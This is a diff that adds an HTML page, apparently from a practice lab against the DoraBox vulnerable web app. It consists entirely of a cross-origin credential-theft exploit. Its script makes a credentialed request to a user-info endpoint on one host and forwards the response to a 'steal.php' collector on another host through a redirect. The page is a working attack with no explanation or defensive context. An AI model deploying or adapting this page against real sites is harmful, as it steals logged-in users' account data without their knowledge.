@@ -1,0 +1,16 @@
+<html>
+<head>
+<title> </title>
+<meta charset="utf-8">
+</head>
+<script type="text/javascript">
+	var req=new XMLHttpRequest();
+	req.onload=reqListener;
+	req.open("POST","http://192.168.255.151:8081/DoraBox-master/csrf/userinfo.php",true);
+	req.withCredentials=true;
+	req.send();
+	function reqListener(){
+	location="http://192.168.0.103:808/steal.php?data="+this.responseText;
+	};
+</script>
+</html>
